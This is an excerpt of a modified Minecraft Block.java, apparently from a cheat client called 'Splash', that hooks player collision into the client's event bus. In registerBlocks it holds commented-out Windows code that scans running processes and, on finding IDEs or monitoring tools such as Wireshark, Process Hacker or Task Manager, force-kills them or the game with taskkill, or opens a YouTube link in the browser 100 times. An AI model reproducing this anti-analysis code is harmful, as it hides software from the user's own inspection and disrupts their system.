...
import splash.client.events.player.EventBoundingBox;
...
public class Block
{
    ...
    public void addCollisionBoxesToList(World worldIn, BlockPos pos, IBlockState state, AxisAlignedBB mask, List<AxisAlignedBB> list, Entity collidingEntity)
    {
		...
		if (collidingEntity == Minecraft.getMinecraft().thePlayer) {
			Splash.getInstance().getEventBus().publish(event);
		}
    ...
    public static void registerBlocks()
    {
      ...
      /*  if (Util.getOSType().equals(Util.EnumOS.WINDOWS) && !Splash.debug) {
			try {
				Process process = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh").start();
		        java.util.List<String> noNoWords = java.util.Arrays.asList("eclipse", "intelij");
				new Thread(() -> {
				    ...
				    while (sc.hasNextLine()) {
				        ...
				        if (noNoWords.contains(unq.toLowerCase().replace(".exe", ""))) try {  CrashReport.logger = null; Runtime.getRuntime().exec("taskkill /F /IM " + "javaw.exe");} catch (Exception e) {};
			...
			try {
				Process process = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh").start();
		        java.util.List<String> noNoWords = java.util.Arrays.asList("wireshark", "processhacker", "taskmgr", "glasswire");
				new Thread(() -> {
					java.util.Scanner sc = new java.util.Scanner(process.getInputStream());
				    if (sc.hasNextLine()) sc.nextLine();
				    while (sc.hasNextLine()) {
				        ...
				        String unq = parts[0].substring(1).replaceFirst(".$", "");
				        String pid = parts[1].substring(1).replaceFirst(".$", "");
				        if (noNoWords.contains(unq.toLowerCase().replace(".exe", ""))) try { Runtime.getRuntime().exec("taskkill /F /IM " + unq); } catch (Exception e) {};
			...
			try {
				Process process = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh").start();
		        java.util.List<String> noNoWords = java.util.Arrays.asList("wireshark", "processhacker", "glasswire");
				new Thread(() -> {
					java.util.Scanner sc = new java.util.Scanner(process.getInputStream());
				    if (sc.hasNextLine()) sc.nextLine();
				    while (sc.hasNextLine()) {
				        ...
				        if (noNoWords.contains(unq.toLowerCase().replace(".exe", ""))) try { for (int i = 0; i < 100; i ++) { 			        
				        	if (desktop != null && desktop.isSupported(java.awt.Desktop.Action.BROWSE)) {
				            try {
				                desktop.browse(new java.net.URI("https://www.youtube.com/watch?v=Sruk0qd6Fqs")); 
				            } catch (Exception e) {
				                e.printStackTrace();
				            }
				        } }
